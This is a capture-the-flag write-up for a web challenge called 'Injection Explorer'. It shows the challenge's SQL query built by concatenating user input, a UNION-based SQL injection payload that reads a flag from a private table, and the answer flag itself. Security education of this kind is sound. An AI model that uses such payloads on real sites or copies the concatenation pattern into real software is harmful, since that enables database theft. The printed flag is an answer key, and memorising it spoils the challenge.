---
challenge: Injection Explorer
description: Exploit a vulnerability in the website to extract hidden information lurking within its database.\nSource code for the website is attached.
flag: ATR{B1LL_15_N0T_4_G00D_PR0GR4MM3R}
scoring: decaylog(350,250,10)
value: 350
category: Hard
authors: Sean McGinty
---

# Injection Explorer

[Back to Home](../../README.md)

## Points

Hard - 350 points

## Description

Exploit a vulnerability in the website to extract hidden information lurking within its database.
Source code for the website is attached.

See [https://github.com/s3ansh33p/atr24_injection_explorer](https://github.com/s3ansh33p/atr24_injection_explorer) for the source code.

## Solution

Looking in the app.js file, we can see that the website is using a SQLite database to store information.

The website allows us to search for names from a `public` table.

The setup SQL is as follows:
```sql
CREATE TABLE names (name varchar(255));
CREATE TABLE private (flag varchar(255));
INSERT INTO names (name) VALUES ('Alice', 'Bob', 'Carol', 'Dave', 'Eve', 'Frank', 'Grace', 'Heidi', 'Ivan', 'Judy', 'Katherine', 'Lochlan', 'Michael', 'Nick', 'Oscar', 'Patrick', 'Quincy', 'Rupert', 'Sybil', 'Trent', 'Ulysses', 'Victor', 'Walter', 'Xavier', 'Yvonne', 'Zoe');
INSERT INTO private (flag) VALUES ('ATR{TEST_FLAG}');
```

The website does a very poor job of sanitising user input, allowing us to perform SQL injection, as it simply concatenates the user input into the SQL query.
```js
const sql = "SELECT name FROM names WHERE name LIKE '%" + query + "%'";
```

By simply starting our query with `'`, we can add our own SQL to the query.

We know that the flag is stored in the `private` table, so we can use a UNION query to extract the flag.

```sql
' UNION SELECT flag FROM private --
```

This will be templated into the SQL query as follows:
```sql
SELECT name FROM names WHERE name LIKE '%' UNION SELECT flag FROM private -- %'
```

The use of `--` comments out the rest of the query, so we avoid any syntax errors.

This returns the flag and the list of names on the website, which is `ATR{B1LL_15_N0T_4_G00D_PR0GR4MM3R}`.